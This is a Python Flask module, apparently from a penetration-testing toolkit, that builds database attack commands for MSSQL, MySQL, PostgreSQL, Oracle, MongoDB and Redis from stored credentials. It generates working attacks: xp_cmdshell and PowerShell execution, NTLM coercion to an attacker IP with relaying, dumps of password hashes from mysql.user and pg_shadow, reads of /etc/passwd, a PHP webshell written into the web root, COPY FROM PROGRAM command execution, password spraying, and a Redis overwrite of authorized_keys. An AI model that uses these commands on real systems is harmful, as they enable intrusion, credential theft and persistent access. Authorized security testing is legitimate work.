"""Database attack module for ZeroCool.

A catalog of database enumeration & exploitation actions across MSSQL, MySQL,
PostgreSQL, Oracle, MongoDB and Redis — built from the engagement credentials
and a target. Same pattern as the AD/Web/Cloud modules: read context -> build
command -> run via the runner (or send into a shell / route via proxychains).
"""

from __future__ import annotations

import shlex

from flask import Blueprint, jsonify, render_template, request

import storage
import tools

db_bp = Blueprint("db", __name__)


def _q(v):
    return shlex.quote(v) if v else ""


def cmd(*parts):
    return " ".join(p for p in parts if p)


def pv(ctx, name, default=""):
    return (ctx["p"].get(name) or "").strip() or default


def build_context(params, eng):
    creds = eng.get("credentials") or []
    try:
        idx = int(params.get("cred_index", "0"))
    except (TypeError, ValueError):
        idx = -1
    cred = creds[idx] if 0 <= idx < len(creds) else {}
    targets = eng.get("targets") or []
    default_target = targets[0] if targets else (eng.get("dc_ip") or "")
    return {
        "target": (params.get("target") or default_target or "TARGET").strip(),
        "user": (params.get("o_user") or cred.get("username") or "").strip(),
        "password": (params.get("o_pass") if params.get("o_pass") is not None else cred.get("password", "")) or "",
        "nthash": (params.get("o_hash") or cred.get("ntlm_hash") or "").strip(),
        "domain": (params.get("o_domain") or eng.get("domain") or "").strip(),
        "local_auth": str(params.get("local_auth", "")).lower() in ("1", "true", "on", "yes"),
        "windows_auth": str(params.get("windows_auth", "")).lower() in ("1", "true", "on", "yes"),
        "ip": (eng.get("attacker_ip") or "ATTACKER_IP").strip(),
        "proxychains": str(params.get("proxychains", "")).lower() in ("1", "true", "on", "yes"),
        "p": params,
    }


def nxc_auth(ctx):
    parts = []
    if ctx["user"]:
        parts.append("-u " + _q(ctx["user"]))
    if ctx["nthash"] and not ctx["password"]:
        parts.append("-H " + _q(ctx["nthash"]))
    else:
        parts.append("-p " + _q(ctx["password"]))
    if ctx["domain"] and not ctx["local_auth"]:
        parts.append("-d " + _q(ctx["domain"]))
    if ctx["local_auth"]:
        parts.append("--local-auth")
    return " ".join(parts)


def mssqlclient(ctx):
    princ = (ctx["domain"] + "/" if (ctx["domain"] and ctx["windows_auth"]) else "") + ctx["user"] + ":" + ctx["password"]
    flag = "-windows-auth" if ctx["windows_auth"] else ""
    return _q(princ) + "@" + ctx["target"], flag


# --- MSSQL ---
def b_mssql_shell(ctx):
    auth, flag = mssqlclient(ctx)
    return cmd("impacket-mssqlclient", auth, flag)
def b_mssql_query(ctx): return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-q", _q(pv(ctx, "query", "SELECT @@version")))
def b_mssql_priv(ctx): return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-M mssql_priv")
def b_mssql_xpcmd(ctx): return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-x", _q(pv(ctx, "command", "whoami")))
def b_mssql_xpps(ctx): return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-X", _q(pv(ctx, "command", "whoami")))
def b_mssql_links(ctx): return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-q", _q("EXEC sp_linkedservers"))
def b_mssql_coerce(ctx):
    return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-q", _q(f"EXEC master..xp_dirtree '\\\\{ctx['ip']}\\x'"))
def b_mssql_readfile(ctx):
    f = pv(ctx, "file", "C:\\Windows\\win.ini")
    return cmd("nxc mssql", ctx["target"], nxc_auth(ctx), "-q", _q(f"SELECT * FROM OPENROWSET(BULK '{f}', SINGLE_CLOB) AS x"))
def b_mssql_relay(ctx): return cmd("impacket-ntlmrelayx -smb2support -t", f"mssql://{ctx['target']}")


# --- MySQL ---
def _mysql_base(ctx):
    return cmd("mysql -h", ctx["target"], "-u", _q(ctx["user"]), "-p" + _q(ctx["password"]) if ctx["password"] else "")
def b_mysql_shell(ctx): return _mysql_base(ctx)
def b_mysql_query(ctx): return cmd(_mysql_base(ctx), "-e", _q(pv(ctx, "query", "SHOW DATABASES;")))
def b_mysql_creds(ctx): return cmd(_mysql_base(ctx), "-e", _q("SELECT user,host,authentication_string FROM mysql.user;"))
def b_mysql_readfile(ctx): return cmd(_mysql_base(ctx), "-e", _q(f"SELECT LOAD_FILE('{pv(ctx, 'file', '/etc/passwd')}');"))
def b_mysql_webshell(ctx):
    wp = pv(ctx, "webpath", "/var/www/html/s.php")
    return cmd(_mysql_base(ctx), "-e", _q(f"SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '{wp}';"))


# --- PostgreSQL ---
def _psql_base(ctx):
    pw = f"PGPASSWORD={_q(ctx['password'])} " if ctx["password"] else ""
    return pw + cmd("psql -h", ctx["target"], "-U", _q(ctx["user"]), "-d", _q(pv(ctx, "db", "postgres")))
def b_psql_shell(ctx): return _psql_base(ctx)
def b_psql_query(ctx): return cmd(_psql_base(ctx), "-c", _q(pv(ctx, "query", "SELECT version();")))
def b_psql_creds(ctx): return cmd(_psql_base(ctx), "-c", _q("SELECT usename,passwd FROM pg_shadow;"))
def b_psql_rce(ctx):
    c = pv(ctx, "command", "id")
    return cmd(_psql_base(ctx), "-c", _q(f"DROP TABLE IF EXISTS zc;CREATE TABLE zc(o text);COPY zc FROM PROGRAM '{c}';SELECT * FROM zc;"))
def b_psql_readfile(ctx):
    f = pv(ctx, "file", "/etc/passwd")
    return cmd(_psql_base(ctx), "-c", _q(f"CREATE TABLE IF NOT EXISTS zr(o text);COPY zr FROM '{f}';SELECT * FROM zr;"))


# --- Oracle ---
def b_oracle_odat(ctx): return cmd("odat all -s", ctx["target"])
def b_oracle_sid(ctx): return cmd("odat sidguesser -s", ctx["target"])
def b_oracle_passguess(ctx): return cmd("odat passwordguesser -s", ctx["target"], "-d", _q(pv(ctx, "sid", "XE")))
def b_oracle_sqlplus(ctx):
    return cmd("sqlplus", _q(f"{ctx['user']}/{ctx['password']}@//{ctx['target']}/{pv(ctx, 'sid', 'XE')}"))


# --- MongoDB ---
def b_mongo_shell(ctx): return cmd("mongosh", _q(f"mongodb://{ctx['target']}:27017"))
def b_mongo_dbs(ctx): return cmd("mongosh --quiet --host", ctx["target"], "--eval", _q("db.adminCommand('listDatabases')"))


# --- Redis ---
def b_redis_cli(ctx): return cmd("redis-cli -h", ctx["target"])
def b_redis_info(ctx): return cmd("redis-cli -h", ctx["target"], "info")
def b_redis_keys(ctx): return cmd("redis-cli -h", ctx["target"], "--scan")
def b_redis_ssh(ctx):
    return cmd("redis-cli -h", ctx["target"],
               _q(f"config set dir /root/.ssh/") + "; "
               + cmd("redis-cli -h", ctx["target"]) + " config set dbfilename authorized_keys; "
               + "# then: set x \"<your pubkey>\"; save")


# --- Discovery ---
def b_db_scan(ctx):
    scope = " ".join((storage.load_engagement().get("scope") or [ctx["target"]]))
    return cmd("nmap -Pn -sV -p 1433,1521,3306,5432,6379,27017,5984,9200", scope)


I = lambda name, label, ph="", default="": {"name": name, "label": label, "placeholder": ph, "default": default}
QY = I("query", "Query", "SELECT @@version")
CM = I("command", "Command", "whoami")
FL = I("file", "File path", "/etc/passwd")

ACTIONS = [
    dict(id="mssql_shell", cat="MSSQL", label="Interactive shell", desc="impacket-mssqlclient.", build=b_mssql_shell),
    dict(id="mssql_query", cat="MSSQL", label="Run query", desc="Run a SQL query via NetExec.", build=b_mssql_query, inputs=[QY]),
    dict(id="mssql_priv", cat="MSSQL", label="Privilege check", desc="mssql_priv module (impersonation/links).", build=b_mssql_priv),
    dict(id="mssql_xpcmd", cat="MSSQL", label="xp_cmdshell exec", desc="Command exec (auto-enables xp_cmdshell).", build=b_mssql_xpcmd, inputs=[CM]),
    dict(id="mssql_xpps", cat="MSSQL", label="PowerShell exec", desc="Run PowerShell via MSSQL.", build=b_mssql_xpps, inputs=[I("command", "PowerShell", "whoami")]),
    dict(id="mssql_links", cat="MSSQL", label="Linked servers", desc="Enumerate linked servers (lateral movement).", build=b_mssql_links),
    dict(id="mssql_coerce", cat="MSSQL", label="Coerce NTLM (xp_dirtree)", desc="Force the SQL service to auth to you (relay/crack).", build=b_mssql_coerce),
    dict(id="mssql_readfile", cat="MSSQL", label="Read a file", desc="OPENROWSET BULK file read.", build=b_mssql_readfile, inputs=[I("file", "File", "C:\\Windows\\win.ini")]),
    dict(id="mssql_relay", cat="MSSQL", label="Relay to MSSQL", desc="ntlmrelayx target for captured auth.", build=b_mssql_relay),

    dict(id="mysql_shell", cat="MySQL", label="Interactive shell", desc="mysql client.", build=b_mysql_shell),
    dict(id="mysql_query", cat="MySQL", label="Run query", desc="", build=b_mysql_query, inputs=[I("query", "Query", "SHOW DATABASES;")]),
    dict(id="mysql_creds", cat="MySQL", label="Dump user hashes", desc="mysql.user authentication_string.", build=b_mysql_creds),
    dict(id="mysql_readfile", cat="MySQL", label="Read a file", desc="LOAD_FILE (needs FILE priv).", build=b_mysql_readfile, inputs=[FL]),
    dict(id="mysql_webshell", cat="MySQL", label="Write webshell", desc="INTO OUTFILE into the web root.", build=b_mysql_webshell, inputs=[I("webpath", "Web path", "/var/www/html/s.php")]),

    dict(id="psql_shell", cat="PostgreSQL", label="Interactive shell", desc="psql client.", build=b_psql_shell, inputs=[I("db", "Database", "postgres", "postgres")]),
    dict(id="psql_query", cat="PostgreSQL", label="Run query", desc="", build=b_psql_query, inputs=[I("db", "Database", "postgres", "postgres"), I("query", "Query", "SELECT version();")]),
    dict(id="psql_creds", cat="PostgreSQL", label="Dump pg_shadow", desc="Stored password hashes.", build=b_psql_creds, inputs=[I("db", "Database", "postgres", "postgres")]),
    dict(id="psql_rce", cat="PostgreSQL", label="RCE (COPY FROM PROGRAM)", desc="Command exec as the postgres user.", build=b_psql_rce, inputs=[I("db", "Database", "postgres", "postgres"), CM]),
    dict(id="psql_readfile", cat="PostgreSQL", label="Read a file", desc="COPY FROM file.", build=b_psql_readfile, inputs=[I("db", "Database", "postgres", "postgres"), FL]),

    dict(id="oracle_odat", cat="Oracle", label="ODAT all", desc="Oracle Database Attacking Tool, full sweep.", build=b_oracle_odat),
    dict(id="oracle_sid", cat="Oracle", label="SID guesser", desc="Find the SID.", build=b_oracle_sid),
    dict(id="oracle_passguess", cat="Oracle", label="Password guesser", desc="Default/weak account spray.", build=b_oracle_passguess, inputs=[I("sid", "SID", "XE", "XE")]),
    dict(id="oracle_sqlplus", cat="Oracle", label="sqlplus login", desc="Authenticated sqlplus.", build=b_oracle_sqlplus, inputs=[I("sid", "SID", "XE", "XE")]),

    dict(id="mongo_shell", cat="MongoDB", label="Connect (mongosh)", desc="Often no auth by default.", build=b_mongo_shell),
    dict(id="mongo_dbs", cat="MongoDB", label="List databases", desc="adminCommand listDatabases.", build=b_mongo_dbs),

    dict(id="redis_cli", cat="Redis", label="Connect (redis-cli)", desc="Often no auth by default.", build=b_redis_cli),
    dict(id="redis_info", cat="Redis", label="INFO", desc="Server info / version.", build=b_redis_info),
    dict(id="redis_keys", cat="Redis", label="Scan keys", desc="Enumerate keys.", build=b_redis_keys),
    dict(id="redis_ssh", cat="Redis", label="Write SSH key (RCE)", desc="Abuse config set dir/dbfilename to write authorized_keys.", build=b_redis_ssh),

    dict(id="db_scan", cat="Discovery", label="DB port sweep", desc="nmap the common DB ports across scope.", build=b_db_scan),
]
ACTIONS_BY_ID = {a["id"]: a for a in ACTIONS}


def serializable_catalog():
    return [{"id": a["id"], "cat": a["cat"], "label": a["label"], "desc": a["desc"],
             "inputs": a.get("inputs", [])} for a in ACTIONS]


@db_bp.route("/db")
def db():
    eng = storage.load_engagement()
    catalog = serializable_catalog()
    cats = []
    for a in catalog:
        if a["cat"] not in cats:
            cats.append(a["cat"])
    return render_template("db.html", eng=eng, catalog=catalog, categories=cats)


@db_bp.route("/db/build", methods=["POST"])
def db_build():
    payload = request.get_json(silent=True) or {}
    action = ACTIONS_BY_ID.get(payload.get("action_id"))
    if not action:
        return jsonify({"error": "unknown action"}), 400
    eng = storage.load_engagement()
    ctx = build_context(payload.get("params", {}), eng)
    command = action["build"](ctx)
    if ctx["proxychains"]:
        command = tools.proxychains_prefix() + command
    return jsonify({"command": command, "warnings": [], "label": action["label"]})
